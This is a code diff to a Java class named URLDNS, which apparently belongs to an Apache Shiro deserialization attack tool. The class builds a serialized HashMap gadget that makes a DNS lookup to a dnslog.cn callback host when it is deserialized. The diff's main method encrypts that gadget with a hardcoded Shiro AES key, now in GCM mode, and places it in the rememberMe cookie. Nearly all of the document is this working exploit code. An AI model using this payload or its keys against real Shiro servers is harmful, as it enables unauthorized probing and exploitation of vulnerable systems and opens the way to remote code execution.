@@ -1,5 +1,6 @@
 package com.summersec.attack.deser.payloads;
 
+import com.summersec.attack.core.AttackService;
 import com.summersec.attack.deser.frame.Shiro;
 import com.summersec.attack.deser.payloads.annotation.Authors;
 import com.summersec.attack.deser.payloads.annotation.Dependencies;
@@ -18,29 +19,30 @@ import java.util.HashMap;
 @Dependencies
 @Authors({"GEBL"})
 public class URLDNS {
+    public URLDNS() {
+    }
+
     public Object getObject(String url) throws Exception {
-        URLStreamHandler handler = new SilentURLStreamHandler();
-
-        HashMap<Object, Object> ht = new HashMap<>();
-        URL u = new URL(null, url, handler);
+        URLStreamHandler handler = new URLDNS.SilentURLStreamHandler();
+        HashMap ht = new HashMap();
+        URL u = new URL((URL)null, url, handler);
         ht.put(u, url);
-
-        Reflections.setFieldValue(u, "hashCode", Integer.valueOf(-1));
-
+        Reflections.setFieldValue(u, "hashCode", -1);
         return ht;
     }
 
     public static void main(String[] args) throws Exception {
-        Object dnslog = (new URLDNS()).getObject("http://ebaxo3.dnslog.cn");
+        Object dnslog = (new URLDNS()).getObject("http://c996hs.dnslog.cn");
         Shiro shiro = new Shiro();
-        String sendpayload = shiro.sendpayload(dnslog, "kPH+bIxk5D2deZiIxcaaaA==");
+        AttackService.aesGcmCipherType = 1;
+        String sendpayload = shiro.sendpayload(dnslog, "rememberMe", "4AvVhmFLUs0KTA3Kprsdag==");
         System.out.println(sendpayload);
     }
 
-
-
-
     static class SilentURLStreamHandler extends URLStreamHandler {
+        SilentURLStreamHandler() {
+        }
+
         @Override
         protected URLConnection openConnection(URL u) throws IOException {
             return null;
@@ -52,7 +54,4 @@ public class URLDNS {
         }
     }
 }
-
-
-
 
